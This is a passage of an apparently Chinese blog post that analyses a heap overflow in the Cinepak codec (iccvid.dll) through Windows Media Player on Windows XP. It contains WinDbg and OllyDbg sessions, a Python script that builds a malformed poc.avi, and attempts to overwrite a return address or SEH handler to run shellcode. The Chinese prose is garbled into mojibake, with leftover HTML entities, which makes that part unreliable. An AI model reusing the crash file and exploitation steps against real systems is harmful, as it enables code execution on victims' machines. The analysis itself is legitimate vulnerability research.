    è¿™é‡Œé‡‡ç”¨ç¬¬äºŒç§æ–¹æ³•,è¯¦ç»†æ“ä½œå¦‚ä¸‹

win+r:cmd
gflags -i &quot;C:\Program Files\Windows Media Player\wmplayer.exe&quot; -hpa
    Current Registry Settings for wmplayer.exe executable are: 00000000
åŒå‡»è¿è¡Œwmplayer.exe
windbgé™„åŠ wmplayer.exe
!gflag
    0:003&amp;gt; !gflag
    Current NtGlobalFlag contents: 0x00000000
    å¦‚æœä¸Šé¢æ²¡æœ‰å…ˆæ‰§è¡Œgflags.exe -i ...wmplayer.exe -hpa,è¿™é‡Œåœ¨windbgä¸­æ‰§è¡Œå®Œ!gflagåç»“æœä¸­ä¼šæ˜¾ç¤ºhpaé¡µå †è¿˜å­˜åœ¨
sxe ld:iccvid.dll
sx
    0:003&amp;gt; sx
      ct - Create thread - ignore
      et - Exit thread - ignore
     cpr - Create process - ignore
     epr - Exit process - break
      ld - Load module - break
           (only break for iccvid.dll)
g
åœ¨wmplayer.exeçª—å£ä¸­æ‰“å¼€poc.avi
    0:003&amp;gt; g
    ModLoad: 73b70000 73b87000   C:\WINDOWS\system32\iccvid.dll
    eax=00000001 ebx=00000000 ecx=00000044 edx=000a2ed0 esi=00000000 edi=00000000
    eip=7c92e4f4 esp=0237e28c ebp=0237e380 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    ntdll!KiFastSystemCallRet:
    7c92e4f4 c3              ret

lmm iccvid v
    0:007&amp;gt; lmm iccvid v
    start    end        module name
    73b70000 73b87000   iccvid     (deferred)             
        Image path: C:\WINDOWS\system32\iccvid.dll
        Image name: iccvid.dll
        Timestamp:        Mon Apr 14 10:12:25 2008 (4802BD89)
        CheckSum:         000219FF
        ImageSize:        00017000
        File version:     1.10.0.12
        Product version:  1.10.0.0
        File flags:       0 (Mask 3F)
        File OS:          40004 NT Win32
        File type:        3.8 Driver
        File date:        00000000.00000000
        Translations:     0409.04e4
        CompanyName:      Radius Inc.
        ProductName:      Cinepak for Windows 32
        InternalName:     iccvid
        OriginalFilename: iccvid.drv
        ProductVersion:   1.10.0.0
        FileVersion:      1.10.0.11
        FileDescription:  CinepakÂ® Codec
        LegalCopyright:   Copyright Â© 1992-1995 Radius Inc., All Rights Reserved
        LegalTrademarks:  CinepakÂ® is a trademark of Radius Inc.
    æŸ¥çœ‹iccvidæ¨¡å—çš„è¯¦ç»†ä¿¡æ¯,è¿™é‡Œä¸èƒ½å†™æˆlmm iccvid.dll v,é‚£æ ·ä¸ä¼šæ‰¾åˆ°iccvidæ¨¡å—

bp 73b7cbee

bl
    0:007&amp;gt; bl
     0 e 73b7cbee     0001 (0001)  0:**** iccvid!Decompress+0x118
g
    0:007&amp;gt; g
    Breakpoint 0 hit
    eax=00000001 ebx=0ac5fd88 ecx=0005e2c0 edx=fffffee0 esi=0011db50 edi=0a9c0050
    eip=73b7cbee esp=0ac5fd38 ebp=0ac5fd60 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    iccvid!Decompress+0x118:
    73b7cbee e8bb55ffff      call    iccvid!CVDecompress (73b721ae)

bp 73b722cc
    è¿™ä¸ªåœ°å€æ˜¯ä¸Šé¢é€šè¿‡è®¾ç½®hpaæ·»åŠ é¡µå †æ•æ‰åˆ°çš„å¼‚å¸¸å¤„çš„æŒ‡ä»¤
    73b722cc f3a5            rep movs dword ptr es:[edi],dword ptr [esi] es:0023:1027b000=???????? 

g
    0:010&amp;gt; g
    Breakpoint 1 hit
    eax=00002000 ebx=0a93d330 ecx=00000800 edx=0aa5fd38 esi=00147008 edi=00149008
    eip=73b722cc esp=0aa5fd04 ebp=0aa5fd30 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    iccvid!CVDecompress+0x11e:
    *** ERROR: Module load completed but symbols could not be loaded for C:\WINDOWS\system32\wmploc.dll
    73b722cc f3a5            rep movs dword ptr es:[edi],dword ptr [esi] es:0023:00149008=00000000 
    ds:0023:00147008=00930093

?edi;?esi
    0:010&amp;gt; ?edi;?esi
    Evaluate expression: 1347592 = 00149008
    Evaluate expression: 1339400 = 00147008
    ä¹Ÿå³edi=149008,esi=147008

!heap -p -a 149008
    0:010&amp;gt; !heap -p -a 149008
        address 00149008 found in
        _HEAP @ a0000
          HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state
            00147000 0c01 0000  [01]   00147008    06000 - (busy)
              ? wmploc+20093
    è¯´æ˜ediå±äºa0000å †çš„147000å †å—,è¿™ä¸ªå †å—æ˜¯å ç”¨æ€,è¿™ä¸ªå †å—ä»1470008åˆ°147008+6000=14D008ä¸ºè¿™ä¸ªå †å—çš„æ•°æ®åŒº

!heap -p -a 147008
    0:010&amp;gt; !heap -p -a 147008
        address 00147008 found in
        _HEAP @ a0000
          HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state
            00147000 0c01 0000  [01]   00147008    06000 - (busy)
              ? wmploc+20093
    è¯´æ˜esiå±äºa0000å †çš„147000å †å—,è¿™ä¸ªå †å—æ˜¯å ç”¨æ€,è€Œä¸”æ­£å¥½esi(147008)æ˜¯è¿™ä¸ªå †å—çš„ç´¢å¼•,è¯´æ˜73b722ccå¤„çš„rep
    movsæŒ‡ä»¤æ˜¯è¦å°†147000å †å—ä¸­çš„æ•°æ®å¾€è¿™ä¸ªå †å—è‡ªå·±çš„æ•°æ®åŒºå¼€å§‹åç§»149008-147008=2000å¤„å¼€å§‹å¤åˆ¶,å¯é€šè¿‡ecxæŸ¥çœ‹è¦
    å¤åˆ¶å¤šå°‘å­—èŠ‚æ•°æ®

?ecx
    0:010&amp;gt; ?ecx
    Evaluate expression: 2048 = 00000800
    800&amp;lt;6000-2000,åº”è¯¥ä¸ä¼šè¦†ç›–å †å—,ä½†æ˜¯+hpaæ—¶çš„ç¡®è¯´æ˜¯è¿™ä¸ªrep movsæŒ‡ä»¤å¯¼è‡´çš„å¼‚å¸¸,å…ˆç»§ç»­è¿è¡Œä¸‹å»

t
    0:010&amp;gt; t
    Breakpoint 1 hit
    eax=00002000 ebx=0a93d330 ecx=000007ff edx=0aa5fd38 esi=0014700c edi=0014900c
    eip=73b722cc esp=0aa5fd04 ebp=0aa5fd30 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
    iccvid!CVDecompress+0x11e:
    73b722cc f3a5            rep movs dword ptr es:[edi],dword ptr [esi] es:0023:0014900c=00000000 
    ds:0023:0014700c=00820082
    å‘ç°å†æ¬¡ä¸­æ–­,ä¹Ÿå³rep movsä¸æ˜¯ä¸€æ¬¡å°±ç»“æŸå¤åˆ¶äº†,æ­¤æ—¶edi=14900c,esi=14700c,å‰é¢çš„edi=149008,esi=147008,è¯´æ˜åˆš
    å¤åˆ¶å®Œ4å­—èŠ‚æ•°æ®,ä½†æ˜¯æ­¤æ—¶ecx=7ff,ä¸Šé¢ecx=800,è¯´æ˜ä¸€å…±è¦å¤åˆ¶4*800=2000&amp;lt;6000-2000,è¿™æ ·ç®—,è¿™ä¸ªå¤åˆ¶ç»“æŸåæ˜¯ä¸ä¼š
    è¦†ç›–å½“å‰å †å—çš„ä¸‹ä¸€å †å—çš„,åº”è¯¥ä¸ä¼šå¯¼è‡´å¼‚å¸¸,æš‚æ—¶ä¸å¯ç†è§£,ç»§ç»­å¾€ä¸‹èµ°

t 
    0:010&amp;gt; t
    Breakpoint 1 hit
    eax=00002000 ebx=0a93d330 ecx=000007fe edx=0aa5fd38 esi=00147010 edi=00149010
    eip=73b722cc esp=0aa5fd04 ebp=0aa5fd30 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
    iccvid!CVDecompress+0x11e:
    73b722cc f3a5            rep movs dword ptr es:[edi],dword ptr [esi] es:0023:00149010=00000000 
    ds:0023:00147010=00820082
    æƒ…å†µå’Œä¸Šé¢ä¸€æ ·,ç…§è¿™æ ·ä¸‹å»,ç›´åˆ°rep movså®Œæˆåº”è¯¥éƒ½ä¸ä¼šå¼‚å¸¸,ä½†æ˜¯windbgåœ¨è®¾ç½®é¡µå †æ—¶çš„ç¡®è¯´æ˜¯è¿™ä¸€æ¡æŒ‡ä»¤çš„é—®é¢˜,å°
    è¯•å–æ¶ˆ73b722ccå¤„å¯¹åº”çš„rep movsæŒ‡ä»¤,åœ¨è¿™ä¸€å¥ä¸Šé¢ä¸‹æ–­ç‚¹,çŒœæµ‹æœ‰å¯èƒ½æ˜¯ä¸€è½®rep movså®Œæˆåè¿˜æœ‰å…¶ä»–æœºä¼šå†æ‰§è¡Œåˆ°è¿™
    é‡Œ,ç„¶åæ‰å‘ç”Ÿè¦†ç›–å¯¼è‡´å¼‚å¸¸

bc *
ub eip
    0:010&amp;gt; ub eip
    iccvid!CVDecompress+0x102:
    73b722b0 807d1300        cmp     byte ptr [ebp+13h],0
    73b722b4 751b            jne     iccvid!CVDecompress+0x123 (73b722d1)
    73b722b6 803e11          cmp     byte ptr [esi],11h
    73b722b9 7516            jne     iccvid!CVDecompress+0x123 (73b722d1)
    73b722bb 8b4b1c          mov     ecx,dword ptr [ebx+1Ch]
    73b722be 8d3c01          lea     edi,[ecx+eax]
    73b722c1 b900080000      mov     ecx,800h
    73b722c6 8db700e0ffff    lea     esi,[edi-2000h]
    è¯´æ˜ä¸Šä¸€å¥æ±‡ç¼–æŒ‡ä»¤å¯¹åº”çš„åœ°å€æ˜¯73b722c6

bp 73b722c6
g
    0:010&amp;gt; g
    Breakpoint 0 hit
    eax=00004000 ebx=0a93d330 ecx=00000800 edx=0aa5fd38 esi=01c1eb22 edi=0014b008
    eip=73b722c6 esp=0aa5fd04 ebp=0aa5fd30 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    iccvid!CVDecompress+0x118:
    73b722c6 8db700e0ffff    lea     esi,[edi-2000h]   
    æœç„¶ä¸­æ–­åˆ°rep movsçš„ä¸Šä¸€å¥
p
    0:010&amp;gt; p
    eax=00004000 ebx=0a93d330 ecx=00000800 edx=0aa5fd38 esi=00149008 edi=0014b008
    eip=73b722cc esp=0aa5fd04 ebp=0aa5fd30 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    iccvid!CVDecompress+0x11e:
    73b722cc f3a5            rep movs dword ptr es:[edi],dword ptr [esi] es:0023:0014b008=00000000 
    ds:0023:00149008=00930093
    æ­¤æ—¶ecx=800,edi=14b008,esi=149008,å†çœ‹ä¸‹æ­¤æ—¶çš„å¤åˆ¶æ•°æ®ä¸å †å—çš„å…³ç³»

!heap -p -a 14b008
    0:010&amp;gt; !heap -p -a 14b008
        address 0014b008 found in
        _HEAP @ a0000
          HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state
            00147000 0c01 0000  [01]   00147008    06000 - (busy)
              ? wmploc+20093
    ediä¸å‰é¢æ‰€åœ¨çš„å †å—ä¸€æ ·,ä»ç„¶æ˜¯åœ¨a0000å †çš„147008å †å—ä¸­,edi+800*4=14d008=147008+6000=14d008,è¯´æ˜è¿™ä¸€æ¬¡çš„rep
    movsæŒ‡ä»¤ä¼šåˆšå¥½æŠŠå½“å‰å †å—çš„æ•°æ®åŒºå¡«å……åˆ°æœ€å,è¿™æ ·åº”è¯¥ä¹Ÿä¸ä¼šç”±äºè¦†ç›–ä¸‹ä¸€ä¸ªå †å—å¯¼è‡´å¼‚å¸¸,å†æ¬¡æ¨æµ‹,å¯èƒ½è¿˜æœ‰ä¸‹ä¸€æ¬¡
    æœºä¼šä¼šå†æ‰§è¡Œåˆ°73b722ccå¤„çš„rep movsæŒ‡ä»¤

g
    0:010&amp;gt; g
    Breakpoint 0 hit
    eax=00006000 ebx=0a93d330 ecx=00000800 edx=0aa5fd38 esi=01c1eb32 edi=0014d008
    eip=73b722c6 esp=0aa5fd04 ebp=0aa5fd30 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    iccvid!CVDecompress+0x118:
    73b722c6 8db700e0ffff    lea     esi,[edi-2000h]
    æœç„¶å†æ¬¡ä¸­æ–­äº†,è¯´æ˜çŒœæµ‹æ˜¯å¯¹çš„

p
    0:010&amp;gt; p
    eax=00006000 ebx=0a93d330 ecx=00000800 edx=0aa5fd38 esi=0014b008 edi=0014d008
    eip=73b722cc esp=0aa5fd04 ebp=0aa5fd30 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    iccvid!CVDecompress+0x11e:
    73b722cc f3a5            rep movs dword ptr es:[edi],dword ptr [esi] es:0023:0014d008=0c01008e 
    ds:0023:0014b008=00930093
    æ­¤æ—¶edi=14d008,esi=14b008,ecx=800

!heap -p -a 14d008
    0:010&amp;gt; !heap -p -a 14d008
        address 0014d008 found in
        _HEAP @ a0000
          HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state
            0014d008 008e 0000  [01]   0014d010    00468 - (busy)
    è¿™é‡Œä¹Ÿå¯çœ‹å‡º,14d008æ˜¯ä¸Šé¢147000å †å—çš„ä¸‹ä¸€ä¸ªæ–°çš„å †å—çš„å…¥å£åœ°å€,è¿™ä¸ªæ–°å †å—çš„åœ°å€æ˜¯ä»14d008å¼€å§‹åˆ°
    14d010+468=14d478,è€Œè¿™æ¬¡è¦å¤åˆ¶çš„åœ°å€èŒƒå›´æ˜¯ä»edi=14d008åˆ°edi+800*4=14f008&amp;gt;14d478,è€Œä»14d478å¼€å§‹çš„åœ°å€ç©ºé—´å·²
    ç»å±äºä¸‹ä¸€ä¸ªå †å—,å¦‚ä¸‹

!heap -p -a 14d478
    0:010&amp;gt; !heap -p -a 14d478
        address 0014d478 found in
        _HEAP @ a0000
          HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state
            0014d478 008e 0000  [01]   0014d480    00468 - (busy)       
    è¯´æ˜14d478è¿™ä¸ªå †å—ä¼šè¢«è¦†ç›–,ä¸”14d480+468=14d8e8&amp;lt;14f008,ä¹Ÿå³è¦†ç›–å®Œè¿™ä¸ªå †å—è¿˜è¦ç»§ç»­è¦†ç›–åé¢çš„å †å—,è¿™æ ·ææœ‰å¯èƒ½ä¼šå¯¼
    è‡´å¼‚å¸¸çš„å‘ç”Ÿ,å¯ä»¥é¢„æµ‹,å†æ¬¡æ‰§è¡Œgå°†ä¼šå‘ç”Ÿå¼‚å¸¸
g
    0:010&amp;gt; g
    (1ac.1bc): Access violation - code c0000005 (first chance)
    First chance exceptions are reported before any exception handling.
    This exception may be expected and handled.
    eax=00006000 ebx=0a93d330 ecx=00000402 edx=0aa5fd38 esi=0014c000 edi=0014e000
    eip=73b722cc esp=0aa5fd04 ebp=0aa5fd30 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
    iccvid!CVDecompress+0x11e:
    73b722cc f3a5            rep movs dword ptr es:[edi],dword ptr [esi] es:0023:0014e000=???????? 
    ds:0023:0014c000=00000000
    é¢„æµ‹æ­£ç¡®,æ­¤æ—¶ecx=402,è¯´æ˜æ˜¯å¤åˆ¶äº†(800-402)*4=3fe*4=ff8(10è¿›åˆ¶çš„4088ä¸ª)å­—èŠ‚åç¨‹åºå¼‚å¸¸,å¹¶å†ä¸å¯æ§,å•ç‹¬è¿è¡Œ
    wmplayer.exeå¹¶æ‰“å¼€poc.aviæ—¶ä¼šå¼¹å‡ºå¦‚ä¸‹æŠ¥é”™å¯¹è¯æ¡†
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/heap-4.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;è¯´æ˜æ˜¯å¤åˆ¶äº†4008ä¸ªå­—èŠ‚å,ä¸‹é¢çš„å†…å­˜ä¸å¯å†™äº†,å¼•å‘å¼‚å¸¸,ç°åœ¨è¦æƒ³åŠæ³•æ§åˆ¶eip,æ‰§è¡Œæˆ‘çš„shellcode,è¦æƒ³æ§åˆ¶eip,ç°åœ¨è€ƒè™‘
ä»ä»¥ä¸‹å‡ ä¸ªè§’åº¦ä¸Šå…¥æ‰‹:
    1&amp;gt;è¶…é•¿æ•°æ®è¦†ç›–æ ˆä¸­çš„retn
    2&amp;gt;è¶…é•¿æ•°æ®è¦†ç›–æ ˆä¸­çš„seh
    3&amp;gt;æ‰¾åˆ°DWORD SHOOTæœºä¼š

1&amp;gt;è¶…é•¿æ•°æ®è¦†ç›–æ ˆä¸­çš„retn
    è¿™ç§å¯èƒ½æ€§å‡ ä¹å¯ä»¥å¿½ç•¥,ä¸€èˆ¬å †æº¢å‡ºæ¼æ´çš„åˆ©ç”¨é‡‡ç”¨DWORD SHOOTçš„&quot;ç²¾ç¡®æ‰“å‡»&quot;,è¶…é•¿æ•°æ®è¦†ç›–ä½œä¸º&quot;åœ°æ¯¯å¼è½°ç‚¸&quot;è¿™ç§æ‰‹æ®µ
    ä¸€èˆ¬ç”¨äºæ ˆæº¢å‡º,å› ä¸ºretnåœ¨æ ˆä¸­,è€Œè¦æƒ³æŠŠæ•°æ®ä»å †åŒºè¦†ç›–åˆ°æ ˆåŒº,è¦å¤åˆ¶è¶…é•¿è¶…é•¿çš„æ•°æ®,æ­¤ä¾‹ä¸­,å½“eip=73B721EDæ—¶,å¯¹
    åº”å¦‚ä¸‹æŒ‡ä»¤,è¯¥eipåˆ°è¾¾æ–¹å¼ä¸ºåœ¨odä¸­å•ç‹¬æ‰“å¼€iccvid.dll,åœ¨73b7cbeeå¤„ä¸‹æ–­ç‚¹,è¯¥å¤„å¯¹åº”ä¸Šé¢çš„windbgçš„å…³é”®callä¸‹æ–­ç‚¹
    å¤„,ç„¶åodé™„åŠ é‡æ–°æ‰“å¼€çš„wmplayer.exe,å¹¶ç”¨wmplayer.exeæ‰“å¼€poc.avi,è§¦å‘73b7cbeeå¤„çš„æ–­ç‚¹,f7è·Ÿè¿›å…³é”®call,å•æ­¥åˆ°
    73b721edå¤„
        73B721ED  |.  8B75 0C       mov esi,[arg.2]
    æ­¤æ—¶odä¸­çš„æç¤ºå¤„æ˜¾ç¤ºå¦‚ä¸‹ä¿¡æ¯:
        å †æ ˆ ss:[0A80FD3C]=01C2CAF8
        esi=00000000
    åœ¨odæç¤ºçª—å£ä¸­çš„01c2caf8ä¸Šå³é”®åœ¨æ•°æ®çª—å£ä¸­è·Ÿéšæ•°å€¼,ç»“æœå¦‚ä¸‹:
        01C2CAF8  00 00 00 68 01 60 01 20 00 10 10 00 00 10 00 00  ...h` .....
        01C2CB08  00 00 00 60 01 60 20 00 00 00 11 00 00 10 41 41  ...`` .....AA
        01C2CB18  41 41 41 41 41 41 41 41 41 41 11 00 00 10 41 41  AAAAAAAAAA..AA
        01C2CB28  41 41 41 41 41 41 41 41 41 41 11 00 00 10 41 41  AAAAAAAAAA..AA
        01C2CB38  41 41 41 41 41 41 41 41 41 41 11 00 00 10 41 00  AAAAAAAAAA..A.
        01C2CB48  69 64 78 31 10 00 00 00 30 30 64 63 10 00 00 00  idx1...00dc...
    ä¹Ÿå³æ­¤æ—¶å¯¹åº”çš„æ•°æ®ä¸ºpoc.aviä¸­çš„cinepak_codec_data1å­—æ®µçš„æ•°æ®,å¦‚ä¸‹å›¾,å¯¹åº”exploit-dbé“¾æ¥ä¸º:
        https://www.exploit-db.com/exploits/15112/
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/heap-5.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    æ­¤æ—¶esp=0A80FD04,è€Œå¯æ§è¾“å…¥çš„æ•°æ®æ‰€åœ¨çš„å†…å­˜åœ°å€ä¸º01c2caf8,0a80fd04-01c2caf8=8BE320C=146682380ä¸ªå­—èŠ‚
    =139.887218475341796875 Må¤§å°,å¯è§æ•°æ®é‡ä¸å°,è¿™æ ·è‚¯å®šä¼šè¦†ç›–å¾ˆå¤šæ•°æ®,åœ¨æ‰§è¡Œåˆ°retnå‰å¿…ç„¶ä¼šå¼•å‘å¼‚å¸¸,æ‰€ä»¥æƒ³é€šè¿‡
    è¦†ç›–retnè¾¾åˆ°æ§åˆ¶eipæ˜¯ä¸å¯å–çš„

2&amp;gt;è¶…é•¿æ•°æ®è¦†ç›–æ ˆä¸­çš„seh
    å¯¹åº”1ä¸­å¯è§‚å¯Ÿåˆ°å†…å­˜ä¸­çš„æ•°æ®ä¸ºcinepak_codec_data1å­—æ®µæ—¶,eip=73b721ed,alt+v,æŸ¥çœ‹seh,ç»“æœå¦‚ä¸‹:
        SEH é“¾ç”¨äº  çº¿ç¨‹  000006D4
        åœ°å€       SEå¤„ç†ç¨‹åº
        0A80FFDC   kernel32.7C839AC0
    è¦æƒ³è¦†ç›–åˆ°0a80ffdcå¤„,éœ€è¦è¦†ç›–0a80ffdc+4-01c2caf8=146683112ä¸ªå­—èŠ‚=139.88791656494140625 Må¤§å°,é‡æ–°ä¿®æ”¹ç”Ÿæˆ
    poc.aviçš„pythonä»£ç ,å°è¯•è¦†ç›–åˆ°sehå¤„ç†ç¨‹åºçš„åœ°å€,ä»1c2caf8åˆ°poc.aviçš„æœ€åä¸€ä¸ªæ„é€ çš„æ•°æ®æ‰€åœ¨çš„å­—ç¬¦å…±æœ‰105ä¸ªå­—
    èŠ‚,éœ€è¦åœ¨åé¢åŠ å¤š146683112-105=146683007ä¸ªå­—èŠ‚,å†åŠ 4ä¸ªå­—èŠ‚å¯ä»¥è¦†ç›–sehçš„å¼‚å¸¸å¤„ç†ç¨‹åºæŒ‡é’ˆ,ä¹Ÿå³146683011ä¸ªå­—èŠ‚
    ,æ„é€ ä»£ç å¦‚ä¸‹,åœ¨åŸæ¥çš„ä»£ç ä¸­åŠ å…¥
        my_data=&#39;B&#39;*146683011
        avifile.write(my_data)

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import sys
 
def main():
 
    aviHeaders = &#39;\x52\x49\x46\x46\x58\x01\x00\x00\x41\x56\x49\x20\x4C\x49\x53\x54\xC8\x00\x00\x00\x68\x64\x72\x6C\x61\x76\x69\x68\x38\x00\x00\x00\xA0\x86\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x01\x00\x00\x4E\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x60\x01\x00\x00\x20\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x4C\x49\x53\x54\x7C\x00\x00\x00\x73\x74\x72\x6C\x73\x74\x72\x68\x38\x00\x00\x00\x76\x69\x64\x73\x63\x76\x69\x64\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xE8\x03\x00\x00\x10\x27\x00\x00\x00\x00\x00\x00\x4E\x00\x00\x00\x20\x74\x00\x00\xFF\xFF\xFF\xFF\x00\x00\x00\x00\x00\x00\x00\x00\x60\x01\x20\x01\x73\x74\x72\x66\x28\x00\x00\x00\x28\x00\x00\x00\x50\x01\x00\x00\x20\x01\x00\x00\x01\x00\x18\x00\x63\x76\x69\x64\x84\x8D\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#39;
    padding = &#39;\x4A\x55\x4E\x4B\x00\x00\x00\x00\x4A\x55\x4E\x4B\x00\x00\x00\x00&#39;
    movi_tag = &#39;\x4C\x49\x53\x54\x5C\x00\x00\x00\x6D\x6F\x76\x69\x30\x30\x64\x63\x10\x00\x00\x00&#39;
    cinepak_codec_data1 = &#39;\x00\x00\x00\x68\x01\x60\x01\x20&#39;
    number_of_coded_strips = &#39;\x00\x10&#39;
    cinepak_codec_data2 = &#39;\x10\x00\x00\x10\x00\x00\x00\x00\x00\x60\x01\x60\x20\x00\x00\x00\x11\x00\x00\x10\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x11\x00\x00\x10\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x11\x00\x00\x10\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x11\x00\x00\x10\x41\x00&#39;
    idx_tag = &#39;\x69\x64\x78\x31\x10\x00\x00\x00\x30\x30\x64\x63\x10\x00\x00\x00\x04\x00\x00\x00\x68\x00\x00\x00&#39;

    my_data=&#39;B&#39;*146683011
     
    avifile = open(&#39;poc.avi&#39;, &#39;wb+&#39;)
    avifile.write(aviHeaders)
    avifile.write(padding)
    avifile.write(movi_tag)
    avifile.write(cinepak_codec_data1)
    avifile.write(number_of_coded_strips)
    avifile.write(cinepak_codec_data2)
    avifile.write(idx_tag)

    avifile.write(my_data)
     
    avifile.close()
    print &#39;[-] AVI file generated&#39;
     
if __name__ == &#39;__main__&#39;:
    main()
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    ubuntuä¸‹æ–°ç”Ÿæˆçš„pov.aviæ–‡ä»¶146.7M,æ‹·è´åˆ°winxpä¸­,ç”¨wmplayer.exeåœ¨odé™„åŠ ä¸‹æ‰“å¼€,åŒæ ·å•æ­¥åˆ°73b721edå¤„,åœ¨æç¤ºçª—
    å£ä¸­å³é”®åœ¨æ•°æ®çª—å£ä¸­è·Ÿéšæ•°å€¼,å¦‚ä¸‹å›¾
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/heap-6.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    ä»ä¸Šé¢å›¾ä¸­çœ‹å‡º,æ•°æ®çª—å£ä¸­å­—ç¬¦&quot;B&quot;å¹¶æ²¡æœ‰å¤åˆ¶146683011ä¸ªåˆ°å†…å­˜å°±è¢«æˆªæ–­äº†,è¯´æ˜æƒ³åˆ©ç”¨è¶…é•¿æ•°æ®ä»å †åŒºè¦†ç›–åˆ°æ ˆåŒºä¸­
    çš„sehçš„æƒ³æ³•ä¹Ÿä¸èƒ½å®ç°

3&amp;gt;æ‰¾åˆ°ä¸€æ¬¡DWORD SHOOSTæœºä¼š
    å¦‚æœèƒ½æ‰¾åˆ°ä¸€æ¬¡DWORD SHOOTæœºä¼š,é‚£å°±æœ‰è¾ƒå¤šé€‰æ‹©å¯ä»¥æ§åˆ¶eipäº†,ä½†æ˜¯ä¸Šé¢æåˆ°DWORD SHOOTçš„æœºä¼šåœ¨ç¬”è€…çœ‹æ¥åªæœ‰ç©ºé—²å †
    å—çš„å¸ä¸‹,ä¹Ÿå³å¯¹åº”æ–°å †å—çš„åˆ†é…ä¼šæœ‰DWORD SHOOTæœºä¼š,ç°åœ¨è¦æƒ³åŠæ³•æ‰¾åˆ°è¿™æ ·çš„æœºä¼š,ä¸Šé¢è°ƒè¯•è¿‡ç¨‹ä¸­å‘ç°å½“æ‰§è¡Œåˆ°å…³é”®
    çš„rep movsæŒ‡ä»¤ç¬¬ä¸‰æ¬¡æ—¶ä¼šå‘ç”Ÿå¼‚å¸¸,å¿…é¡»è¦åœ¨rep movsæŒ‡ä»¤å‘ç”Ÿå¼‚å¸¸å‰æ‰¾åˆ°ä¸€æ¬¡HeapAllocçš„è°ƒç”¨æ‰æœ‰å¯èƒ½å¯ä»¥DWORD
    SHOOT,è€Œä¸”HeapAllocè¦å‡ºç°åœ¨poc.aviä¸­çš„æ•°æ®å¤åˆ¶åˆ°å†…å­˜ä¸­ä¹‹å

    ä¹Ÿå³è¦åœ¨wmplayer.exeæ‰“å¼€poc.aviä¹‹ååˆ°rep movsç¬¬ä¸‰æ¬¡å¤åˆ¶å¼‚å¸¸å‘ç”Ÿä¹‹å‰è¿™æœŸé—´æ‰¾åˆ°HeapAllocçš„è°ƒç”¨
    
    é‡æ–°odé™„åŠ wmplayer.exe,åœ¨1c2caf8ä¸Šä¸‹å†…å­˜å†™å…¥æ–­ç‚¹(1c2caf8å¯¹åº”åŸæ¥çš„poc.aviä¸­çš„ç”Ÿæˆæ•°æ®ä¸­çš„
    cinepak_codec_data1å­—æ®µ),å¹¶ç”¨wmplayer.exeæ‰“å¼€åŸæ¥çš„poc.avi
        è¿™ç§æƒ³æ³•æ²¡èƒ½å®ç°,å› ä¸ºodé™„åŠ wmplayer.exeå,1c2caf8å†…å­˜åœ°å€è¿˜æ²¡å‡ºç°,æ— æ³•ä¸‹å†…å­˜å†™å…¥æ–­ç‚¹,å°è¯•ç­‰1c2caf8å‡ºç°
        åå†ä¸‹å†…å­˜æ–­ç‚¹å¹¶é‡æ–°odåŠ è½½,ä½†æ˜¯è¿™æ ·æ— æ³•åœ¨1c2caf8è¢«å†™å…¥ä¹‹å‰æ–­ä¸‹

